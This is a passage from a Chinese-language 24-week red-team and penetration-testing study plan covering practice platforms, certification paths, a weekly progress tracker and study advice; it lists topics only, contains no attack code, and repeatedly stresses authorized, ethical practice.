+    - TryHackMe - Offensive Pentesting Path
+    - HackTheBox - Easy/Medium Machines
+
+  高级 (Advanced):
+    - HackTheBox - Medium/Hard Machines
+    - HackTheBox - Pro Labs (Dante, Offshore, Rastalabs)
+    - TryHackMe - Red Teaming Path
+    - VulnHub综合系列
+
+────────────────────────────────────────────────────────────────
+认证路径推荐
+────────────────────────────────────────────────────────────────
+
+  路径A (渗透测试方向):
+    eJPT -> eCPPT -> OSCP -> OSWE -> OSEP
+
+  路径B (红队方向):
+    eJPT -> OSCP -> CRTO -> OSEP/CRTL
+
+  路径C (Web安全方向):
+    PortSwigger Web Security Academy -> eWPT -> OSWE -> eWPTX
+
+  短期目标 (0-6个月):
+    - eJPT (入门友好, 完全实操)
+    - TryHackMe完成率 > 50%
+    - HTB Pro Hacker Rank
+
+  中期目标 (6-18个月):
+    - OSCP (行业黄金标准)
+    - HTB Guru/Hacker Elite Rank
+    - 50+ HTB Machines
+    - 10+ 漏洞报告
+
+  长期目标 (18个月+):
+    - CRTO (红队专业认证)
+    - OSEP (高级渗透测试)
+    - 发表原创安全研究成果
+    - 独立承担红队演习项目
+
+================================================================================
+八、进度跟踪表 (Progress Tracker)
+================================================================================
+
+  说明: 每周完成学习后, 在对应方框中打勾 [√]。
+  可以打印此表贴在墙上, 或在电脑上用Markdown跟踪。
+
+────────────────────────────────────────────────────────────────
+第一阶段: 基础打造期 (第1-4周)
+────────────────────────────────────────────────────────────────
+  第1周: Linux基础与环境搭建              [ ] 完成
+    - 周一: Linux概述与目录结构             [ ]
+    - 周二: 文件操作命令                    [ ]
+    - 周三: 文件权限与用户管理               [ ]
+    - 周四: 文本处理与管道                  [ ]
+    - 周五: 进程管理与网络基础命令            [ ]
+    - 周六: 复习日                         [ ]
+
+  第2周: 网络原理基础                      [ ] 完成
+    - 周一: OSI模型与TCP/IP协议栈            [ ]
+    - 周二: IP地址与子网划分                [ ]
+    - 周三: TCP协议深入                     [ ]
+    - 周四: UDP协议与常见应用层协议           [ ]
+    - 周五: 网络实战 — 搭建实验环境          [ ]
+    - 周六: 复习日                         [ ]
+
+  第3周: 编程基础 — Bash与Python           [ ] 完成
+    - 周一: Bash脚本基础                    [ ]
+    - 周二: Python基础 (一)                 [ ]
+    - 周三: Python基础 (二) — 网络编程       [ ]
+    - 周四: Python基础 (三) — HTTP与数据处理  [ ]
+    - 周五: 综合编程练习                    [ ]
+    - 周六: 复习日                         [ ]
+
+  第4周: 安全基础概念与渗透测试流程           [ ] 完成
+    - 周一: 安全基础概念                    [ ]
+    - 周二: 渗透测试方法论                   [ ]
+    - 周三: ArchStrike工具库概览           [ ]
+    - 周四: 实验环境完整搭建                 [ ]
+    - 周五: 第一阶段复盘与考核               [ ]
+    - 周六: 复习日                         [ ]
+
+  第一阶段考核 (第4周末):
+    [ ] Linux操作考核通过
+    [ ] 网络考刻通过
+    [ ] 编程考核通过
+    [ ] 环境考核通过
+    [ ] 第一阶段全部打勾, 进入第二阶段!
+
+────────────────────────────────────────────────────────────────
+第二阶段: 技能积累期 (第5-12周)
+────────────────────────────────────────────────────────────────
+  第5周: 信息收集与侦察技术 (一)             [ ] 完成
+  第6周: 网络扫描与漏洞评估                  [ ] 完成
+  第7周: Web安全基础 (一) — XSS与CSRF       [ ] 完成
+  第8周: Web安全基础 (二) — SQL注入与命令注入  [ ] 完成
+  第9周: 漏洞利用基础 (一) — Metasploit入门   [ ] 完成
+  第10周: 漏洞利用深入                      [ ] 完成
+  第11周: 密码攻击与无线安全基础              [ ] 完成
+  第12周: 第二阶段复习与综合考核              [ ] 完成
+
+  第二阶段考核 (第12周末):
+    [ ] 完成了5台以上靶机
+    [ ] 输出合格的渗透报告
+    [ ] Web漏洞全部通关DVWA全难度
+    [ ] 第二阶段全部打勾, 进入第三阶段!
+
+────────────────────────────────────────────────────────────────
+第三阶段: 进阶提升期 (第13-20周)
+────────────────────────────────────────────────────────────────
+  第13周: 内网渗透基础与AD域                [ ] 完成
+  第14周: 域渗透实战                        [ ] 完成
+  第15周: 免杀与防御绕过技术                 [ ] 完成
+  第16周: C2框架与红队基础设施               [ ] 完成
+  第17周: 后渗透与权限维持                   [ ] 完成
+  第18周: 社会工程学                        [ ] 完成
+  第19周: 工具开发与自动化 (一)              [ ] 完成
+  第20周: 第三阶段综合考核与总结              [ ] 完成
+
+  第三阶段考核 (第20周末):
+    [ ] 完成域渗透攻击链
+    [ ] 生成可用免杀Payload
+    [ ] 搭建完整C2基础设施
+    [ ] 完成3台以上HTB中等靶机
+    [ ] 开发一款自研工具
+    [ ] 第三阶段全部打勾, 进入第四阶段!
+
+────────────────────────────────────────────────────────────────
+第四阶段: 实战综合期 (第21-24周)
+────────────────────────────────────────────────────────────────
+  第21周: 综合实战 (一) — 完整渗透链         [ ] 完成
+  第22周: 综合实战 (二) — 红蓝对抗模拟        [ ] 完成
+  第23周: 认证准备与职业规划                 [ ] 完成
+  第24周: 最终考核与总结                     [ ] 完成
+
+  最终考核 (第24周末):
+    [ ] 完成2次以上完整渗透
+    [ ] 撰写专业渗透报告
+    [ ] 自研工具发布
+    [ ] 制定认证考试和职业规划
+
+────────────────────────────────────────────────────────────────
+整体统计
+────────────────────────────────────────────────────────────────
+  总学习周期: [ ] / 24 周
+  总通关靶机: _______ 台
+  总开发工具: _______ 款
+  总撰报告: _______ 份
+  已获认证: _______
+
+  毕业宣言: 我已按计划完成24周红队训练, 具备独立渗透测试能力!
+
+================================================================================
+九、心理建设与学习建议 (Mental Preparation)
+================================================================================
+
+────────────────────────────────────────────────────────────────
+正确心态
+────────────────────────────────────────────────────────────────
+
+  1. 保持耐心, 安全学习是长期过程
+     - 红队是一个需要持续积累的领域, 不要期望速成
+     - 每个人的学习速度不同, 不要与他人过度比较
+     - 今天不懂的技术, 三个月后回头看会觉得简单
+     - 罗马不是一天建成的, 红队专家也不是
+
+  2. 遇到困难不要气馁
+     - 渗透测试中80%的时间在"卡住", 这是正常的
+     - 卡住正是学习发生的时候 — 大脑在建立新的连接
+     - 尝试以下方法突破瓶颈:
+       a. 休息15分钟, 散步让大脑放松
+       b. 换一个攻击向量或思路
+       c. 搜索CTF Writeup (但不要直接看答案, 先看提示)
+       d. 重新做一遍信息收集, 可能遗漏了关键信息
+
+  3. 避免"教程地狱" (Tutorial Hell)
+     - 不要只看教程不动手, 动手是最重要的学习方式
+     - 每看30分钟教程, 至少花60分钟亲手操作
+     - 在没有教程的情况下尝试 — 这是最接近实战的状态
+
+  4. 在社区中交流学习
+     - 加入安全社区 (Discord, QQ群, 微信群, Reddit)
+     - 提问前先自己搜索和研究 (RTFM精神)
+     - 帮助他人解答问题也是很好的学习方式
+     - 参与CTF比赛, 团队合作进步最快
+
+  5. 保持白帽道德底线
+     - 永远不要攻击未授权的目标
+     - 在中国, 未经授权的渗透测试属于违法行为
+     - 所有练习在实验环境或授权平台进行
+     - 学到的技术用于防御和保护, 而非破坏
+
+  6. 劳逸结合, 避免 burnout
+     - burnout症状: 丧失动力, 看到终端就烦躁, 不想学习
+     - 预防方法:
+       a. 严格遵守休息日 (周日不学习)
+       b. 每天学习不超过3.5小时
+       c. 保持体能训练 (运动是最好的抗压方式)
+       d. 保持社交活动 (每周至少见朋友一次)
+       e. 有burnout迹象时, 休息1-2天, 完全不做技术
+     - 不要有负罪感 — 休息是为了更好的学习
+
+  7. 知识管理建议
+     - 使用Obsidian/Notion/语雀 建立个人知识库
+     - 每个知识点用自己理解的话复述 (费曼学习法)
+     - 给每个学习主题添加标签, 方便日后检索
+     - 定期回顾和迭代旧笔记
+     - 截图并标注, 一图胜千言
+
+  8. 记录成长轨迹
+     - 每月写一篇博客或总结: 本月学到了什么
+     - 保留每个成功的渗透报告和截图
+     - 3个月后回头看, 你会发现巨大的进步
+     - 这些记录也是未来求职时最好的作品集
+
+────────────────────────────────────────────────────────────────
+学习效率最大化技巧
+────────────────────────────────────────────────────────────────
+
+  1. 番茄工作法:
+     - 25分钟专注学习 + 5分钟休息 = 1个番茄钟
+     - 4个番茄钟后, 休息15-30分钟
+     - 每天记录完成了多少个番茄钟
+
+  2. 费曼学习法:
+     - 尝试把今天学到的概念用大白话讲给"另一个人"
+     - 如果能讲清楚, 说明真正理解了
+     - 讲不清楚的地方就是需要加强的地方
+
+  3. 间隔重复:
+     - 学完一个知识点后:
+       - 当天晚上复习一次
+       - 第3天复习一次
+       - 第7天复习一次
+       - 第30天复习一次
+     - 使用Anki等间隔重复软件记录核心知识点
+
+  4. 主动学习 vs 被动学习:
+     - 被动: 看视频, 看书 (效率较低)
+     - 主动: 动手做, 写笔记, 教别人 (效率较高)
+     - 目标: 主动学习时间 > 被动学习时间
+
+────────────────────────────────────────────────────────────────
+最后的祝愿
+────────────────────────────────────────────────────────────────
+
+  24周的旅程可能看起来很长, 但当你回头看时,
+  你会惊讶于自己从零基础到独立完成渗透测试的蜕变。
+
+  在这个过程中:
+    - 你会遇到挫败和瓶颈
+    - 你会在深夜debug到怀疑人生
+    - 你会在第一次获得root时欢呼雀跃
+    - 你会发现自己真正爱上这个领域
+
+  记住:
+    每一个红队专家, 都曾经是一个面对黑窗口不知所措的初学者。
+    他们能走到今天, 不是因为智商超群,
+    而是因为他们从未放弃。
+
+  欢迎来到红队的世界, 未来的Operator!
+
+  ===== Stay Curious, Stay Ethical, Stay Dangerous! =====
+
+────────────────────────────────────────────────────────────────
+文档版本: v1.0
+编制日期: 2025年
+适用对象: 零基础红队学习者
+训练周期: 24周 (6个月)
+建议更新: 每季度根据个人进度和学习反馈优化调整
+────────────────────────────────────────────────────────────────
